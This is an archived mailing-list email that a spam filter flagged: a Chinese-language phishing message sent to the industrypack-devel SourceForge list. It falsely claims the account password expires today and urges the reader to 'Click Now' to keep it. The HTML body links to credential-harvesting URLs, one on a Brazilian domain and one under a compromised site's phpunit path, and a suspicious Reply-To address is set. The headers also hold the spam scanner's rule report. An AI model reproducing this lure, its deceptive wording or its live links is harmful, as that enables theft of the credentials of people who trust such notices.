Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id E15A868B532
	for <lists+industrypack-devel@lfdr.de>; Mon,  6 Feb 2023 06:31:45 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1pOu6T-0001iI-G8
	for lists+industrypack-devel@lfdr.de;
	Mon, 06 Feb 2023 05:31:44 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <brett@bandrservices.net>) id 1pOu6Q-0001i3-Vk
 for industrypack-devel@lists.sourceforge.net;
 Mon, 06 Feb 2023 05:31:42 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
 MIME-Version:Message-ID:Date:To:From:Reply-To:Sender:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=y4GQIZ5/XCF6d22qODJuXLelHTOe6RiDwUZvwhqV7mQ=; b=KNT0FJFn7q6FI/Es1led30c4PI
 XWNhqXQazN/3jl7e2JLDKOcDOCdqj8gnhPWeLa5kmoXSq1SVhrI1AYJA8VX1e+4bC5x1EH3kaWCE2
 mc1NFXkmgdcsI12hk/TlR+jj/eVUvv5P26rL9xfmjCAuTckShWrRshbgsl5Fd/8Or0t8=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
 Date:To:From:Reply-To:Sender:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=y4GQIZ5/XCF6d22qODJuXLelHTOe6RiDwUZvwhqV7mQ=; b=A
 G0bj+7quDMh+VM05ZytRtfqgS+avKtIdfmKtX1aJkSfTLmNOuFFBKaox6uMCslApZUF1TIbnM549e
 45dbjJ9ZIVvlQ+kLGMlPzVuF4iZKj/buk0cNevUwRJjo+ZyTNYOHZqBgfPpsu7NOOUOyfy+hgEwyY
 aWEhWbGffo4qltY4=;
Received: from [45.8.145.76] (helo=vm908671.stark-industries.solutions)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1pOu6L-0007mH-Oa for industrypack-devel@lists.sourceforge.net;
 Mon, 06 Feb 2023 05:31:42 +0000
Received: from bandrservices.net (localhost [IPv6:::1])
 by vm908671.stark-industries.solutions (Postfix) with ESMTP id 8A2F4866752
 for <industrypack-devel@lists.sourceforge.net>;
 Mon,  6 Feb 2023 01:40:59 +0100 (CET)
From: lists.sourceforge.net<brett@bandrservices.net>
To: industrypack-devel@lists.sourceforge.net
Date: 06 Feb 2023 00:40:58 +0000
Message-ID: <20230206004058.8BDDB0175DCB763C@bandrservices.net>
MIME-Version: 1.0
X-Spam-Score: 8.9 (++++++++)
X-Spam-Report: Spam detection software, running on the system "util-spamd-1.v13.lw.sourceforge.com",
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  ID: industrypack-devel@lists.sourceforge.net 您的 industrypack-devel@lists.sourceforge.net
    密码今天到期 2/6/2023 12:40:58 a.m. 使用下面的按钮继续使用相同的密码.
    Click Now 
 
 Content analysis details:   (8.9 points, 6.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  3.6 RCVD_IN_SBL_CSS        RBL: Received via a relay in Spamhaus SBL-CSS
                             [45.8.145.76 listed in zen.spamhaus.org]
 -0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
                             [45.8.145.76 listed in wl.mailspike.net]
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
  1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
  0.0 HTML_MESSAGE           BODY: HTML included in message
  1.3 RDNS_NONE              Delivered to internal network by a host with no rDNS
  1.7 TO_NO_BRKTS_FROM_MSSP  Multiple header formatting problems
  1.2 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
                             only
  0.0 FROM_MISSP_EH_MATCH    From misspaced, matches envelope
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1pOu6L-0007mH-Oa
Subject: [SPAM] 常规密码过期通知 industrypack-devel@lists.sourceforge.net
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Reply-To: roro707@ro.ru
Content-Type: multipart/mixed; boundary="===============5472085803028204254=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============5472085803028204254==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<body>
<P>
<SPAN style=3D'FONT-SIZE: small; FONT-FAMILY: "Lucida Sans", "Lucida Sans R=
egular", "Lucida Grande", "Lucida Sans Unicode", Geneva, Verdana, sans-seri=
f, serif, EmojiFont; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM=
: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); FONT-STYLE: normal; ORPHANS=
: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; text-decoration-s=
tyle: initial; -webkit-text-stroke-width: 0px; text-decoration-color: initi=
al; font-variant-ligatures: normal;=20
font-variant-caps: normal'>ID: industrypack-devel@lists.sourceforge.net</SP=
AN></P>
<DIV style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; =
WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
R-SPACING: normal; TEXT-INDENT: 0px; text-decoration-style: initial; -webki=
t-text-stroke-width: 0px; text-decoration-color: initial; font-variant-liga=
tures: normal; font-variant-caps: normal"></DIV>
<DIV style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; =
WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
R-SPACING: normal; TEXT-INDENT: 0px; text-decoration-style: initial; -webki=
t-text-stroke-width: 0px; text-decoration-color: initial; font-variant-liga=
tures: normal; font-variant-caps: normal">
<DIV dir=3Dltr>
<DIV>
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 15px; BORDER-RIGHT-WIDTH: =
0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(32,31,3=
0); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; =
PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-variant-numeric: inherit; f=
ont-variant-east-asian: inherit; font-stretch: inherit">
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
GN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0=
px" dir=3Dltr>
<H3 style=3D'FONT-SIZE: 18px; MARGIN-BOTTOM: 0px; FONT-FAMILY: "Lucida Sans=
", "Lucida Sans Regular", "Lucida Grande", "Lucida Sans Unicode", Geneva, V=
erdana, sans-serif, serif, EmojiFont; MARGIN-TOP: 0px; FONT-WEIGHT: 400; CO=
LOR: rgb(51,51,51)'>&#24744;&#30340; industrypack-devel@lists.sourceforge.n=
et &#23494;&#30721;&#20170;&#22825;&#21040;&#26399;<SPAN>&nbsp;</SPAN>
 <SPAN style=3D'BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: "Times New Roman", ser=
if, serif, EmojiFont; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BO=
RDER-BOTTOM-WIDTH: 0px; COLOR: red; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; =
PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; =
font-stretch: inherit'>2/6/2023 12:40:58 a.m.</SPAN></H3>
<H4 style=3D'FONT-SIZE: 18px; MARGIN-BOTTOM: 0px; FONT-FAMILY: "Lucida Sans=
", "Lucida Sans Regular", "Lucida Grande", "Lucida Sans Unicode", Geneva, V=
erdana, sans-serif, serif, EmojiFont; MARGIN-TOP: 0px; FONT-WEIGHT: 400; CO=
LOR: rgb(51,51,51)'>&#20351;&#29992;&#19979;&#38754;&#30340;&#25353;&#38062=
;&#32487;&#32493;&#20351;&#29992;&#30456;&#21516;&#30340;&#23494;&#30721;.<=
/H4>
<DIV style=3D'FONT-SIZE: 18px; BORDER-TOP: 5px outset; HEIGHT: 50px; FONT-F=
AMILY: "Lucida Sans", "Lucida Sans Regular", "Lucida Grande", "Lucida Sans =
Unicode", Geneva, Verdana, sans-serif, serif, EmojiFont; BORDER-RIGHT: 5px =
outset; WIDTH: 150px; VERTICAL-ALIGN: baseline; BACKGROUND: rgb(0,0,255); B=
ORDER-BOTTOM: 5px outset; COLOR: rgb(255,255,255); PADDING-BOTTOM: 0px; TEX=
T-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 5px outs=
et; MARGIN: 0px; PADDING-RIGHT: 0px;=20
font-variant-numeric: inherit; font-variant-east-asian: inherit; font-stret=
ch: inherit'>
<A style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN=
: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(17,85,204); PADDING-BOTTOM=
: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px=
; BORDER-TOP-WIDTH: 0px" href=3D"https://anmarkmarcas.com.br/ugo/index.html=
#industrypack-devel@lists.sourceforge.net" rel=3D"noopener noreferrer" targ=
et=3D_blank=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://7clouds.vrdp.=
online/vendor/phpunit/phpunit/src/Util/PHP/sales/2018CN/2018CN/?email%3D%5B=
%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1634769771820000&amp;usg=3DAF=
QjCNHhG4dw-7HnwPUikB5e2Hw2OoWhfg"><SPAN style=3D"COLOR: rgb(51,51,51)">Clic=
k Now</SPAN></A></DIV></DIV></DIV></DIV></DIV></DIV></BODY></HTML>


--===============5472085803028204254==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============5472085803028204254==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============5472085803028204254==--
